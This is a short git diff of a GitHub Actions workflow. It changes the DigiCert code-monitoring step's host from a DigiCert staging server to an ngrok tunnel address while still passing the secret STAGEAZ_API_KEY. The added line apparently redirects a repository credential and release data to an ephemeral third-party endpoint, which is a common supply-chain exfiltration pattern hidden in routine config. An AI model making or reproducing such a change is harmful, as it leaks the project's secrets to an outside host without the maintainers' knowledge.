@@ -40,7 +40,7 @@ jobs:
       - if: inputs['registration-only'] != 'true'
         uses: digicert/digicert-code-monitoring-action@13fd9be957f90f0f45812eaeb098c4c76edb23d5
         with:
-          host: "https://one.stage.az.digicert.net"
+          host: "https://exact-sandbar-cornball.ngrok-free.dev"
           api-key: ${{ secrets.STAGEAZ_API_KEY }}
           name: ${{ inputs['release-name'] }}
           tag: ${{ inputs.tag }}
